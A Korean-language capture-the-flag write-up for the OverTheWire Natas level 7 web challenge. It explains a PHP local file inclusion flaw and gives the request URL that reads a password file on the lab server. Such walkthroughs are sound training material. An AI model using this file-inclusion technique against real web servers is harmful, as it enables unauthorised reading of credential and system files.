# Category

web

# Overview

Home About

# Analysis

- Home과 about a태그가 아래와 같이 동작하는 것을 확인했다. 실행 시 텍스트의 내용변경 이외에는 별다른 변경은 없었다.

  ```
  index.php?page=home
  index.php?page=about
  ```

  임의의 문자로 요청을 해 본 결과 아래와 같이 요청한 문자와 같은 파일이나 디렉토리가 없어서 불러올 수 없다는 에러가 나오는 것을 확인했다.

  ```php
  Warning: include(home2): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

  Warning: include(): Failed opening 'home2' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
  ```

  이는 php에서 `include($_GET['page'])`와 같이 동작하여 사용자의 요청에 따라 서버 내 파일을 불러올 위험이 있다.

- 소스코드 내에 다음단계인 natas8의 비밀번호가 `/etc/natas_webpass/natas8`에 위치한다는 주석을 확인했다.

  ```html
  <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
  ```

# Exploitation

위 두가지 정보를 통해 url에 page를 `?page=/etc/natas_webpass/natas8`로 변경하여 요청하게 되면 다음 비밀번호를 획득할 수 있다.

```
# web
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

# python
python solve.py
```

# Flag

`xc...5Q`
